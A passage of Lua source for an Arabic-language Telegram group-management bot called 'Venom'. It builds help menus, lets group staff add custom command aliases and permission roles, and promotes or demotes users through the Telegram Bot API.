𖠧︙معاني الاسماء • اوامر النسب • انطق
𖠧︙الايدي • تحويل الصيغ • اوامر التحشيش
𖠧︙ردود المدير • ردود المطور • التحقق
𖠧︙ضافني • حساب العمر • الزخرفه • غنيلي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local Abbs = DataText:match('/HelpList4:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbs:get(Venom..'Abs:Help4')
local Text = [[
𖠧︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تنزيل الكل
𖠧︙الميديا • امسح
𖠧︙تعين عدد الحذف
𖠧︙ترتيب الاوامر
𖠧︙اضف • حذف ↫ امر
𖠧︙حذف الاوامر المضافه
𖠧︙الاوامر المضافه
𖠧︙اضف نقاط ↫ بالرد • بالايدي
𖠧︙اضف رسائل ↫ بالرد • بالايدي
𖠧︙رفع منظف • تنزيل منظف
𖠧︙المنظفين • حذف المنظفين
𖠧︙رفع مدير • تنزيل مدير
𖠧︙المدراء • حذف المدراء
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙نزلني • امسح
𖠧︙الحظر • الكتم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙وضع لقب + اللقب
𖠧︙تفعيل • تعطيل ↫ الرفع
𖠧︙رفع منشئ • تنزيل منشئ
𖠧︙المنشئين • حذف المنشئين
𖠧︙رفع • تنزيل ↫ مشرف
𖠧︙رفع بكل الصلاحيات
𖠧︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المالكين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع • تنزيل ↫ منشئ اساسي
𖠧︙حذف المنشئين الاساسيين 
𖠧︙المنشئين الاساسيين 
𖠧︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local Abbs = DataText:match('/HelpList5:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbs:get(Venom..'Abs:Help5')
local Text = [[
𖠧︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙الكروبات
𖠧︙المطورين
𖠧︙المشتركين
𖠧︙الاحصائيات
𖠧︙المجموعات
𖠧︙اسم البوت + غادر
𖠧︙اسم البوت + تعطيل
𖠧︙كشف + -ايدي المجموعه
𖠧︙رفع مالك • تنزيل مالك
𖠧︙المالكين • حذف المالكين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع • تنزيل ↫ مدير عام
𖠧︙حذف • المدراء العامين 
𖠧︙رفع • تنزيل ↫ ادمن عام
𖠧︙حذف • الادمنيه العامين 
𖠧︙رفع • تنزيل ↫ مميز عام
𖠧︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تحديث
𖠧︙الملفات
𖠧︙المتجر
𖠧︙السيرفر
𖠧︙روابط الكروبات
𖠧︙تحديث السورس
𖠧︙تنظيف الكروبات
𖠧︙تنظيف المشتركين
𖠧︙حذف جميع الملفات
𖠧︙تعيين الايدي العام
𖠧︙تغير المطور الاساسي
𖠧︙حذف معلومات الترحيب
𖠧︙تغير معلومات الترحيب
𖠧︙غادر + -ايدي المجموعه
𖠧︙تعيين عدد الاعضاء + العدد
𖠧︙حظر عام • الغاء العام
𖠧︙كتم عام • الغاء العام
𖠧︙قائمه العام • حذف قائمه العام
𖠧︙وضع • حذف ↫ اسم البوت
𖠧︙اضف • حذف ↫ رد عام
𖠧︙ردود المطور • حذف ردود المطور
𖠧︙تعيين • حذف • جلب ↫ رد الخاص
𖠧︙جلب نسخه الكروبات
𖠧︙رفع النسخه + بالرد على الملف
𖠧︙تعيين • حذف ↫ قناة الاشتراك
𖠧︙جلب كليشه الاشتراك
𖠧︙تغيير • حذف ↫ كليشه الاشتراك
𖠧︙رفع • تنزيل ↫ مطور
𖠧︙المطورين • حذف المطورين
𖠧︙رفع • تنزيل ↫ مطور ثانوي
𖠧︙الثانويين • حذف الثانويين
𖠧︙تعيين • حذف ↫ كليشة الايدي
𖠧︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل ملف + اسم الملف
𖠧︙تعطيل ملف + اسم الملف
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙الاذاعه • الاشتراك الاجباري
𖠧︙ترحيب البوت • المغادره
𖠧︙البوت الخدمي • التواصل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local Abbs = DataText:match('/HelpList6:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
local Help = DevAbs:get(Venom..'Abs:Help6')
local Text = [[
𖠧︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙السورس • موقعي • رتبتي • معلوماتي 
𖠧︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
𖠧︙رسائلي • حذف رسائلي • اسمي • معرفي 
𖠧︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
𖠧︙نقاطي • بيع نقاطي • القوانين • زخرفه 
𖠧︙رابط الحذف • نزلني • اطردني • المطور 
𖠧︙منو ضافني • مشاهدات المنشور • الرابط 
𖠧︙ايدي المجموعه • معلومات المجموعه 
𖠧︙نسبه الحب • نسبه الكره • نسبه الغباء 
𖠧︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙لقبه + بالرد
𖠧︙كول + الكلمه
𖠧︙زخرفه + اسمك
𖠧︙برج + نوع البرج
𖠧︙معنى اسم + الاسم
𖠧︙بوسه • بوسها ↫ بالرد
𖠧︙احسب + تاريخ ميلادك
𖠧︙رفع مطي • تنزيل مطي • المطايه
𖠧︙هينه • هينها ↫ بالرد • بالمعرف
𖠧︙صيحه • صيحها ↫ بالرد • بالمعرف
𖠧︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
𖠧︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
𖠧︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
𖠧︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevAbs:get(Venom.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(Venom.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(Venom.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevAbs:del(Venom.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevAbs:get(Venom..'Abs:NameBot') or "ڤينوم")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(Venom..'Abs:NameBot') or "ڤينوم")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevAbs:get(Venom.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(Venom.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل الامر الجديد", 1, 'html')
DevAbs:del(Venom.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(Venom.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(Venom.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(Venom.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الامر", 1, 'html')
DevAbs:del(Venom.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevAbs:smembers(Venom.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "𖠧︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
Cmds = DevAbs:get(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "𖠧︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevAbs:smembers(Venom.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(Venom.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" then
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevAbs:set(Venom.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevAbs:sadd(Venom.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
send(msg.chat_id_, msg.id_,"𖠧︙تم ترتيب الاوامر بالشكل التالي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙ايدي ↫ ا\n𖠧︙تنزيل الكل ↫ تك\n𖠧︙رفع مميز ↫ م\n𖠧︙رفع ادمن ↫ اد \n𖠧︙رفع مدير ↫ مد \n𖠧︙رفع منشئ ↫ من \n𖠧︙رفع منشئ اساسي ↫ اس  \n𖠧︙تفعيل الايدي بالصوره ↫ تفع\n𖠧︙تعطيل الايدي بالصوره ↫ تعط\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉")  
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevAbs:set(Venom.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevAbs:set(Venom.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source Venom     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "𖠧︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
var = DevAbs:get(Venom.."Comd:New:rt:Abs:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevAbs:smembers(Venom.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevAbs:del(Venom.."Comd:New:rt:Abs:"..v..msg.chat_id_)
DevAbs:del(Venom.."Coomds"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(Venom.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(Venom.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(Venom.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n𖠧︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbs:del(Venom.."Comd:New:rt:Abs:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف الصلاحيه", 1, 'html')
end
if DevAbs:get(Venom.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر", 1, 'html')
DevAbs:del(Venom.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n𖠧︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تستطيع اضافة صلاحية ( عضو • مميز )\n𖠧︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تستطيع اضافة صلاحية ( عضو )\n𖠧︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(Venom.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(Venom.."Comd:New:rt:Abs:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اضافة الصلاحيه", 1, 'html')
DevAbs:del(Venom.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbs:sismember(Venom.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(Venom.."Comd:New:rt:Abs:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbs:sadd(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbs:sadd(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbs:sismember(Venom.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(Venom.."Comd:New:rt:Abs:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(Venom.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(Venom.."Comd:New:rt:Abs:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:set(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(Venom.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(Venom.."Comd:New:rt:Abs:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and VipMem(msg) then
